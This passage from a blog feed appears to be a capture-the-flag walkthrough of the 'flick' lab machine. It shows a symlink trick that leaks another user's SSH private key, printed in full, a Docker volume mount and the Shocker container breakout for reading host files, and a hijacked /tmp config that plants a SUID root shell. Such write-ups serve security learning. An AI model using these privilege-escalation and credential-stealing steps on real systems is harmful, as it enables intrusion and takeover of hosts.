ean@flick:~$ ln -s /home/robin/.bashrc Dockerfile
dean@flick:~$ ls -la
total 44
drwxr-xr-x 3 dean  dean  4096 Feb 23 13:54 .
drwxr-xr-x 4 root  root  4096 Aug  2  2014 ..
-rw------- 1 dean  dean   143 Feb 13 15:46 .bash_history
-rw-r--r-- 1 dean  dean   220 Aug  2  2014 .bash_logout
-rw-r--r-- 1 dean  dean  3486 Aug  2  2014 .bashrc
drwx------ 2 dean  dean  4096 Aug  2  2014 .cache
lrwxrwxrwx 1 dean  dean    19 Feb 23 13:54 Dockerfile -&gt; /home/robin/.bashrc
-rw-r--r-- 1 root  root  1250 Aug  4  2014 message.txt
-rw-r--r-- 1 dean  dean   675 Aug  2  2014 .profile
-rwsr-xr-x 1 robin robin 8987 Aug  4  2014 read_docker
</code></p>

<p>If you look at the link you created, it says it&rsquo;s a broken symbolic link:</p>

<p><code>plain
dean@flick:~$ file Dockerfile
Dockerfile: broken symbolic link to `/home/robin/.bashrc'
</code></p>

<p>However, that doesn&rsquo;t seem to stop the <em>read_docker</em> binary from doing its thing!</p>

<p>``` plain
dean@flick:~$ ./read_docker /home/dean</p>

<h1>~/.bashrc: executed by bash(1) for non-login shells.</h1>

<h1>see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</h1>

<h1>for examples</h1>

<h1>If not running interactively, don&rsquo;t do anything</h1>

<p>[ -z &ldquo;$PS1&rdquo; ] &amp;&amp; return</p>

<h1>don&rsquo;t put duplicate lines or lines starting with space in the history.</h1>

<h1>See bash(1) for more options</h1>

<p>HISTCONTROL=ignoreboth</p>

<h1>append to the history file, don&rsquo;t overwrite it</h1>

<p>shopt -s histappend</p>

<h1>for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</h1>

<p>HISTSIZE=1000
HISTFILESIZE=2000
&hellip;
```</p>

<p>So,we were able to read robin&rsquo;s <em>.bashrc</em> file. That doesn&rsquo;t help us much, but now we know that we can use this to our advantage, if the file that we want to read exists. Let&rsquo;s see if we can&rsquo;t get robin&rsquo;s SSH private key:</p>

<p>``` plain
dean@flick:~$ ln -s /home/robin/.ssh/id_rsa Dockerfile
dean@flick:~$ ls -la Dockerfile
lrwxrwxrwx 1 dean dean 23 Feb 23 14:06 Dockerfile &ndash;> /home/robin/.ssh/id_rsa</p>

<p>dean@flick:~$ ./read_docker /home/dean
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
JB+zHyhus+ill4aWHitcEXiBEjUHx4roC7Al/+tr//cjwUCwlHk75F0CgYEAwZhZ
gBjAo9X+/oFmYlgVebfR3kLCD4pVPMz+HyGCyjSj0+ddsHkYiHBhstBtHh9vU+Pn
JMhrtR9yzXukuyQr/ns1mhEQOUtTaXrsy/1FyRBaISrtcyGAruu5yWubT0gXk2Dq
rwyb6M6MbnwEMZr2mSBU5l27cTKypFqgcA58l78CgYAWM5vsXxCtGTYhFzXDAaKr
PtMLBn8v54nRdgVaGXo6VEDva1+C1kbyCVutVOjyNI0cjKMACr2v1hIgbtGiS/Eb
zYOgUzHhEiPX/dNhC7NCcAmERx/L7eFHmvq4sS81891NrtpMOnf/PU3kr17REiHh
AtIG1a9pg5pHJ6E6sQw2xQKBgHXeqm+BopieDFkstAeglcK8Fr16a+lGUktojDis
EJPIpQ65yaNOt48qzXEv0aALh57OHceZd2qZsS5G369JgLe6kJIzXWtk325Td6Vj
mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
```</p>

<p>Woohoo! It worked! With this we can SSH as robin. I copied the key contents to my machine (don&rsquo;t forget to <em>chmod 600</em>, or you will get an Unprotected Private Key File eror), and logged in as robin.</p>

<p>After a bit of enumeration, I didn&rsquo;t find anything extremely interesting. User robin is able to sudo the following:</p>

<p>``` plain
robin@flick:/opt/start_apache$ sudo -l
Matching Defaults entries for robin on this host:</p>

<pre><code>env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User robin may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /opt/start_apache/restart.sh
</code></pre>

<p>```</p>

<p>I couldn&rsquo;t read the files in that directory (there is an additional file called <em>start.py</em>), because I got a permission denied error. With nothing else to follow, perhaps there is more to be gained from the Docker program. The official documentation for Docker <a href="https://docs.docker.com/reference/commandline/cli/">commands</a> came in handy.</p>

<p>First, I listed all the available containers, and found something:</p>

<p><code>plain
robin@flick:/opt/start_apache$ docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                    PORTS               NAMES
b0f71c63a88c        ubuntu:14.04        /bin/bash           7 months ago        Exited (0) 7 months ago                       sharp_shockley  
</code></p>

<p>It&rsquo;s possible to set up a console session with the container (check the help for the run command to see all the kinds of things you can do with it):</p>

<p><code>plain
robin@flick:/opt/start_apache$ docker run -i -t ubuntu
root@4dfeb7b4ed8c:/# whoami
root
</code></p>

<p>Breaking up the command:</p>

<ul>
<li>Usage: docker run [OPTIONS] IMAGE [COMMAND] [ARG&hellip;]</li>
</ul>


<p>Run a command in a new container</p>

<ul>
<li><p>-i, &mdash;interactive=false: Keep stdin open even if not attached</p></li>
<li><p>-t, &mdash;tty=false: Allocate a pseudo-tty</p></li>
</ul>


<p>But even if we can run as root inside the container, it doesn&rsquo;t solve the problem of getting root outside it. However, I looked more closely at the options for <em>run</em> and I noticed this:</p>

<p><code>plain
-v, --volume=[]: Bind mount a volume (e.g. from the host: -v /host:/container, from docker: -v /container)
</code></p>

<p>Reading the <a href="https://docs.docker.com/userguide/dockervolumes/">documentation</a>, it seems it&rsquo;s possible to mount a volume from the host?! Let&rsquo;s see:</p>

<p><code>plain
docker run -i -t -v /root/:/root/ ubuntu
root@4340d77a56d3:/# ls /root/
53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc  flag.txt
</code></p>

<p>Success! If you can&rsquo;t get root on the box, bring the box to where you are root! :D</p>

<p>The obvious flag is just a decoy:</p>

<p><code>plain
root@4340d77a56d3:/# cat /root/flag.txt
Errr, you are close, but this is not the flag you are looking for.
</code></p>

<p>Of course, the real flag is cleverly hidden inside the directory with a name that screams for attention:</p>

<p>``` plain
root@4340d77a56d3:/# ls /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
real_flag.txt
root@4340d77a56d3:/# cat /root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/real_flag.txt
Congrats!</p>

<p>You have completed &lsquo;flick&rsquo;! I hope you have enjoyed doing it as much as I did creating it :)</p>

<p>ciao for now!
@leonjza
```</p>

<h3>Bonus &ndash; get root command execution on host</h3>

<p>Ok, after an overly lengthy break, I returned to the bonus part of the challenge. I will use an alternate way for this instead of proceeding from where I left off.</p>

<p>Remember the files in <em>/opt/</em> that I couldn&rsquo;t read? Naturally, I was curious about them, and they provide an alternate path to exploitation. And the fact that the Docker version on the box is out of date.. :D</p>

<p>During my initial enumeration, I didn&rsquo;t pay much attention to the fact that Docker is outdated, as can be seen from the following:</p>

<p><code>plain
robin@flick:~$ docker version
Client version: 0.11.0
Client API version: 1.11
Go version (client): go1.2.1
Git commit (client): 15209c3
Server version: 0.11.0
Server API version: 1.11
Git commit (server): 15209c3
Go version (server): go1.2.1
Last stable version: 1.5.0, please update docker
</code></p>

<p>So..maybe there is some nice exploit that can assist us? It turns there is! And it&rsquo;s called <a href="https://github.com/gabrtv/shocker">Shocker</a></p>

<p>A good description of this container-breakout exploit, along with code, can be found <a href="http://stealth.openwall.net/xSports/shocker.c">here</a>. I will quote the gist of it:</p>

<blockquote><p>Demonstrates that any given docker image someone is asking
you to run in your docker setup can access ANY file on your host,
e.g. dumping hosts /etc/shadow or other sensitive info, compromising
security of the host and any other docker VM&rsquo;s on it.</p></blockquote>

<p>I could of course read <em>/etc/shadow</em> or the flags, but I&rsquo;m interested in the <em>/opt/start_apache/</em> files. To read them, you have to modify the code here:</p>

<p>``` c
if (find_handle(fd1, &ldquo;/etc/shadow&rdquo;, &amp;root_h, &amp;h) &lt;= 0)</p>

<pre><code>die("[-] Cannot find valid handle!");
</code></pre>

<p>```</p>

<p>Just insert the path to the file you want to read instead of <em>etc/shadow</em>. So we want <em>/opt/start_apache/restart.sh</em> and <em>/opt/start_apache/start.py</em>. To run the PoC exploit, use the command <code>docker run gabrtv/shocker</code>. To modify source and rebuild, use <code>docker build -t gabrtv/shocker .</code>. I got an error saying that no Dockerfile was found in the current directory, so I just pulled the one from Github and it worked. To compile the exploit (on the Flick box), use the command found in the Dockerfile on Github:</p>

<p><code>plain
cc -Wall -std=c99 -O2 shocker.c -static -Wno-unused-result -o shocker
</code></p>

<p>After rebuilding, I ran the exploit and:</p>

<p>``` plain
robin@flick:~$ docker run gabrtv/shocker
[<strong><em>] docker VMM-container breakout Po&copy; 2014             [</em></strong>]
[<strong><em>] The tea from the 90&rsquo;s kicks your sekurity again.     [</em></strong>]
[<strong><em>] If you have pending sec consulting, I&rsquo;ll happily     [</em></strong>]
[<strong><em>] forward to my friends who drink secury-tea too!      [</em></strong>]</p>

<p><enter>
[<em>] Resolving &lsquo;opt/start_apache/restart.sh&rsquo;
[</em>] Found .
[<em>] Found mnt
[</em>] Found home
[<em>] Found root
[</em>] Found lost+found
[<em>] Found media
[</em>] Found selinux
[<em>] Found boot
[</em>] Found srv
[<em>] Found lib
[</em>] Found dev
[<em>] Found proc
[</em>] Found bin
[<em>] Found lib64
[</em>] Found etc
[<em>] Found ..
[</em>] Found var
[<em>] Found sbin
[</em>] Found sys
[<em>] Found opt
[+] Match: opt ino=246
[</em>] Brute forcing remaining 32bit. This can take a while&hellip;
[<em>] (opt) Trying: 0x00000000
[</em>] #=8, 1, char nh[] = {0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
[<em>] Resolving &lsquo;start_apache/restart.sh&rsquo;
[</em>] Found .
[<em>] Found ..
[</em>] Found start_apache
[+] Match: start_apache ino=137500
[<em>] Brute forcing remaining 32bit. This can take a while&hellip;
[</em>] (start_apache) Trying: 0x00000000
[<em>] #=8, 1, char nh[] = {0x1c, 0x19, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[</em>] Resolving &lsquo;restart.sh&rsquo;
[<em>] Found .
[</em>] Found start.py
[<em>] Found ..
[</em>] Found restart.sh
[+] Match: restart.sh ino=173642
[<em>] Brute forcing remaining 32bit. This can take a while&hellip;
[</em>] (restart.sh) Trying: 0x00000000
[<em>] #=8, 1, char nh[] = {0x4a, 0xa6, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[</em>] #=8, 1, char nh[] = {0x4a, 0xa6, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/shadow output follows:</p>

<h1>!/bin/sh</h1>

<p>/usr/sbin/service apache2 restart
/usr/bin/supervisorctl restart all
```</p>

<p>I was too lazy to modify the print statement, the actual file that was read was the <em>restart.sh</em> file. Not very interesting, so I looked at the other one (this time I&rsquo;m only showing the code):</p>

<p>``` python</p>

<h1>!/usr/bin/python</h1>

<p>&lsquo;&rsquo;'</p>

<pre><code>Simple socket server using threads. Used in the flick CTF
Credit: http://www.binarytides.com/python-socket-server-code-example/
</code></pre>

<p>&lsquo;&rsquo;'</p>

<p>import socket
import os, sys, signal
from thread import *
import subprocess</p>

<h1>import the directory containing our config, and prevent the bytcode writes</h1>

<p>sys.dont_write_bytecode = True</p>

<h1>see if /tmp has a configuration to load.</h1>

<h1>Debugging purposes only!!!</h1>

<p>if os.path.isfile(&lsquo;/tmp/config.py&rsquo;):</p>

<pre><code>sys.path.insert(0, '/tmp')
</code></pre>

<p>else:</p>

<pre><code>sys.path.insert(0, '/etc')
</code></pre>

<h1>import the config</h1>

<p>from config import config</p>

<p>HOST = &lsquo;&rsquo;   # Symbolic name meaning all available interfaces
PORT = 8881 # Arbitrary non-privileged port</p>

<p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</p>

<h1>Bind socket to local host and port</h1>

<p>try:</p>

<pre><code>s.bind((HOST, PORT))
</code></pre>

<p>except socket.error as msg:</p>

<pre><code>print 'Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
sys.exit()
</code></pre>

<h1>Start listening on socket</h1>

<p>s.listen(10)</p>

<h1>Function for handling connections. This will be used to create threads</h1>

<p>def clientthread(conn):</p>

<pre><code>#Sending message to connected client
conn.send('Welcome to the admin server. A correct password will \'flick\' the switch and open a new door:\n&gt; ') #send only takes string

#infinite loop so that function do not terminate and thread do not end.
while True:

    #Receiving from client
    data = conn.recv(1024)
    reply = 'OK: ' + data
    if not data: 
        break

# check if the password is tabupJievas8Knoj
if data.strip() == 'tabupJievas8Knoj':
    return_code = subprocess.call(config['command'], shell=True)  
    if return_code == 0:
        reply += '\nAccepted! The door should be open now :poolparty:\n'
    else:
        reply += '\nAccepted, but it doesn\'t look like the door opened :&lt;\n'

# add the prompt again
reply += '\n&gt; '

    conn.sendall(reply)
#came out of loop
conn.close()
</code></pre>

<h1>now keep talking with the client</h1>

<p>while 1:</p>

<pre><code>#wait to accept a connection - blocking call
conn, addr = s.accept()

#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
start_new_thread(clientthread ,(conn,))
</code></pre>

<p>s.close()
```</p>

<p>So this is the application that provided us with the first foothold on the box! The interesting part is that the program looks for a <em>config.py</em> in <em>/tmp/</em>, and if it can&rsquo;t find one there it loads it from <em>/etc/</em>. Let&rsquo;s see it:</p>

<p>``` plain
robin@flick:~$ cat /etc/config.py
config = {</p>

<pre><code>'command': 'service apache2 restart'
</code></pre>

<p>}
```</p>

<p>So it runs a command?..This is great, because we can hijack it by creating a config file in <em>/tmp/</em> with code of our choosing:</p>

<p>``` plain
robin@flick:~$ cat > /tmp/config.py
config = {</p>

<pre><code>    'command': 'cp /bin/sh /tmp/pwn; chmod 4777 /tmp/pwn'
</code></pre>

<p>}
```</p>

<p>Copied the shell and gave it SUID and full access so we can execute it as root. Next we have to restart the program:</p>

<p>``` plain
obin@flick:~$ sudo /opt/start_apache/restart.sh
 * Restarting web server apache2                                                                                                                     apache2: Could not reliably determine the server&rsquo;s fully qualified domain name, using 127.0.1.1 for ServerName
apache2: Could not reliably determine the server&rsquo;s fully qualified domain name, using 127.0.1.1 for ServerName</p>

<pre><code>                                                                                                                                          [ OK ]
</code></pre>

<p>start_apache-8000: stopped
start_apache-8000: started
```</p>

<p>I looked in <em>/tmp/</em> but the shell wasn&rsquo;t there, so I tried again to connect to port 8881 and give the password. And indeed, now there is a shell waiting there:</p>

<p><code>plain
robin@flick:~$ ls -l /tmp/
total 112
-rw-rw-r-- 1 robin robin     75 Apr  1 14:08 config.py
-rwsrwxrwx 1 root  root  109768 Apr  1 14:17 pwn
</code></p>

<p>Game over!</p>

<p>``` plain
robin@flick:~$ /tmp/pwn</p>

<h1>whoami</h1>

<p>root
```</p>

<blockquote><p>You will be run over by a beer truck.</p></blockquote>
]]></content>
  </entry>
  
</feed>
